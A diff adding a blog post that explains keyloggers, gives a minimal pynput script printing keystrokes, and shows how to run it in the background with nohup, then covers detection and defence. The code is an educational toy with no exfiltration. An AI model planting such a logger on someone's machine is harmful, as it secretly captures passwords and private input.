@@ -1,0 +1,95 @@
+---
+layout: ../../layouts/BlogPostLayout.astro
+title: "Building A Keylogger With Pythone"
+author: Zaid Mukaddam
+pubDate: 2022-09-10
+comments: true
+---
+
+# Building A Keylogger With Python
+
+How long does it take to write a keylogger in Python?
+
+7 lines (if you count jump lines)!
+
+## What Is A Keylogger?
+
+“Keylogger” is short for “Keystroke logger”, as it records what you type on the keyboard. Such scripts are not necessarily evil, but threat actors use them all the time.
+
+The most common approach is to record user inputs and send data to a remote server (e.g., C2). It’s highly efficient and can reveal very sensitive data such as credentials, emails, visited URLS, and many other details.
+
+Keyloggers are a massive threat to security and privacy.
+
+Here, we’ll see a quick example with the keyboard, but it can also log clipboard, screens (some prefer the term “screenloggers”), instant messages, or internet activities.
+
+It’s also possible to embed keyloggers directly in the hardware, for example, between the CPU and the mouse/keyboard. In this case, the analysis requires a physical access, but the detection rate by anti-malware solutions would be significantly lower, perhaps null.
+
+However, even software-based keyloggers can be pretty hard to detect.
+
+## Practical Example In Python
+
+```python
+# keylogger.py
+from pynput import keyboard
+
+def display_keys(key):
+    print(str(key))
+
+with keyboard.Listener(on_press=display_keys) as l:
+    l.join()
+```
+
+It uses the pynput package. You can definitely improve the code by adding more information like timestamps or store the results in a text file. The pynput package allows monitoring the mouse as well.
+
+However, with the basic example above, you can get the following:
+
+>   Key.space <br/>
+    ‘i’<br/>
+    ’n’<br/>
+    ‘g’<br/>
+    Key.space<br/>
+    ’l’<br/>
+    ‘i’<br/>
+    ‘k’<br/>
+    ’e’<br/>
+
+As long as it runs on the machine, it can collect inputs.
+
+## How To Run The Code
+
+Install the package and start the script:
+
+```
+pip install pynput
+python3 keylogger.py &
+```
+
+The & is to run the script in the background. If you need more “persistence,” you can combine it with the nohup command to complete the process even if the user logs out from the terminal:
+
+```
+nohup python3 keylogger.py &
+```
+
+## How To Detect Keyloggers
+Our script would be detected at the speed of light:
+
+```
+ps aux | grep python
+```
+
+In real-world conditions and if it’s a Linux machine, you can try automated tools such as *rkhunter* or *chkrootkit* to detect known rootkits and malware. These tools cannot spot advanced keyloggers written by experienced hackers to evade detection, but script kiddies often use popular kits.
+
+## Keyloggers Can Bypass Security Measures
+
+Such sneaky spywares will keep recording data even after some security measures. Updating credentials and hardening configurations is still necessary but not sufficient.
+
+Password managers are convenient but many solutions only copy-paste data from the manager to the browser. Technically speaking, malware could still intercept the data by sniffing all the network traffic, for example.
+
+In any case, password managers are not designed to block keyloggers.
+
+## Wrap Up
+
+No system is immune to keyloggers. You can’t assume there’s no keylogger on a machine, especially if it has been attacked.
+
+Monitoring outgoing traffic, behaviors and processes can help detect these annoying snitches. However, some situations require destructive analysis, perhaps complete reformat and fresh install, so ensure you backup critical files regularly.
+
